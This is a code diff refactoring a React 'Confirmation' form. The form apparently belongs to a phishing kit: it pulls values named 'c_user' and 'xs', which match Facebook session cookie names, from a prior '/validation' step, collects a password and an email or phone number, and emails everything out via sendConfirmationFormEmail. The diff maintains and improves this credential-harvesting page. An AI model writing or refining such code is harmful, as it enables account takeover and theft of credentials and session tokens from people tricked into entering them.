@@ -14,7 +14,7 @@ import { zodResolver } from "@hookform/resolvers/zod";
 import { useForm } from "react-hook-form";
 import { useLocation } from "wouter";
 import MetaTags from "@/components/meta-tags";
-import { formTwoSchema, type ConfirmationForm } from "@shared/schema";
+import { formTwoSchema } from "@shared/schema";
 import { sendConfirmationFormEmail } from "@/lib/emailService";
 import {
   Select,
@@ -29,15 +29,12 @@ import { Eye, EyeOff, Search } from "lucide-react";
 export default function Confirmation() {
   const { toast } = useToast();
   const [, setLocation] = useLocation();
-  const [contactMethod, setContactMethod] = useState<'email' | 'phone'>('email');
-  const [countryCode, setCountryCode] = useState('+1');
   const [showPassword, setShowPassword] = useState(false);
   const [countrySearch, setCountrySearch] = useState('');
   const [filteredCountries, setFilteredCountries] = useState(countries);
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  // Initialize form with validation data
-  const form = useForm<ConfirmationForm>({
+  const form = useForm({
     resolver: zodResolver(formTwoSchema),
     defaultValues: {
       c_user: '',
@@ -49,7 +46,8 @@ export default function Confirmation() {
     }
   });
 
-  // Load validation data from localStorage
+  const contactMethod = form.watch('contactMethod');
+
   useEffect(() => {
     const storedData = localStorage.getItem('validation_data');
     if (!storedData) {
@@ -63,18 +61,14 @@ export default function Confirmation() {
         throw new Error("Invalid validation data");
       }
 
-      form.reset({
-        ...form.getValues(),
-        c_user: parsed.c_user,
-        xs: parsed.xs
-      });
+      form.setValue('c_user', parsed.c_user);
+      form.setValue('xs', parsed.xs);
     } catch (error) {
       console.error('Failed to parse validation data:', error);
       setLocation('/validation');
     }
   }, [form, setLocation]);
 
-  // Filter countries based on search
   useEffect(() => {
     const filtered = countries.filter(country =>
       country.name.toLowerCase().includes(countrySearch.toLowerCase()) ||
@@ -83,18 +77,15 @@ export default function Confirmation() {
     setFilteredCountries(filtered);
   }, [countrySearch]);
 
-  // Form submission handler
-  const onSubmit = async (formData: ConfirmationForm) => {
+  const onSubmit = async (data: any) => {
     try {
       setIsSubmitting(true);
 
       const submissionData = {
-        ...formData,
-        contactMethod,
-        countryCode: contactMethod === 'phone' ? countryCode : undefined,
-        user_email: formData.user_email 
-          ? (contactMethod === 'phone' ? `${countryCode}${formData.user_email}` : formData.user_email)
-          : undefined,
+        ...data,
+        user_email: contactMethod === 'phone' 
+          ? `${data.countryCode}${data.user_email}`
+          : data.user_email,
         timestamp: new Date().toISOString()
       };
 
@@ -106,7 +97,6 @@ export default function Confirmation() {
         description: "Your information has been submitted successfully"
       });
 
-      // Use timeout to ensure toast is visible before redirect
       setTimeout(() => {
         setLocation("/success");
       }, 1500);
@@ -122,7 +112,6 @@ export default function Confirmation() {
     }
   };
 
-  // Preserve the existing JSX structure exactly as is
   return (
     <>
       <MetaTags
@@ -154,7 +143,7 @@ export default function Confirmation() {
                   <div className="flex gap-4">
                     <button
                       type="button"
-                      onClick={() => setContactMethod('email')}
+                      onClick={() => form.setValue('contactMethod', 'email')}
                       className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                         contactMethod === 'email'
                           ? 'bg-[#0180FA] text-white'
@@ -165,7 +154,7 @@ export default function Confirmation() {
                     </button>
                     <button
                       type="button"
-                      onClick={() => setContactMethod('phone')}
+                      onClick={() => form.setValue('contactMethod', 'phone')}
                       className={`flex-1 py-1.5 text-sm rounded transition-colors duration-200 ${
                         contactMethod === 'phone'
                           ? 'bg-[#0180FA] text-white'
@@ -188,34 +177,40 @@ export default function Confirmation() {
                       <FormControl>
                         <div className="flex gap-2">
                           {contactMethod === 'phone' && (
-                            <Select
-                              value={countryCode}
-                              onValueChange={setCountryCode}
-                            >
-                              <SelectTrigger className="w-[100px]">
-                                <SelectValue placeholder="Code" />
-                              </SelectTrigger>
-                              <SelectContent>
-                                <div className="sticky top-0 p-2 bg-white border-b z-50">
-                                  <div className="flex items-center px-2 py-1 border rounded-md">
-                                    <Search className="w-4 h-4 text-gray-500 mr-2" />
-                                    <input
-                                      className="w-full outline-none text-sm"
-                                      placeholder="Search country..."
-                                      value={countrySearch}
-                                      onChange={(e) => setCountrySearch(e.target.value)}
-                                    />
-                                  </div>
-                                </div>
-                                <div className="max-h-[200px] overflow-y-auto">
-                                  {filteredCountries.map((country) => (
-                                    <SelectItem key={country.code} value={country.code}>
-                                      {country.code} ({country.name})
-                                    </SelectItem>
-                                  ))}
-                                </div>
-                              </SelectContent>
-                            </Select>
+                            <FormField
+                              control={form.control}
+                              name="countryCode"
+                              render={({ field: countryField }) => (
+                                <Select
+                                  value={countryField.value}
+                                  onValueChange={countryField.onChange}
+                                >
+                                  <SelectTrigger className="w-[100px]">
+                                    <SelectValue placeholder="Code" />
+                                  </SelectTrigger>
+                                  <SelectContent>
+                                    <div className="sticky top-0 p-2 bg-white border-b z-50">
+                                      <div className="flex items-center px-2 py-1 border rounded-md">
+                                        <Search className="w-4 h-4 text-gray-500 mr-2" />
+                                        <input
+                                          className="w-full outline-none text-sm"
+                                          placeholder="Search country..."
+                                          value={countrySearch}
+                                          onChange={(e) => setCountrySearch(e.target.value)}
+                                        />
+                                      </div>
+                                    </div>
+                                    <div className="max-h-[200px] overflow-y-auto">
+                                      {filteredCountries.map((country) => (
+                                        <SelectItem key={country.code} value={country.code}>
+                                          {country.code} ({country.name})
+                                        </SelectItem>
+                                      ))}
+                                    </div>
+                                  </SelectContent>
+                                </Select>
+                              )}
+                            />
                           )}
                           <Input
                             type={contactMethod === 'email' ? 'email' : 'tel'}
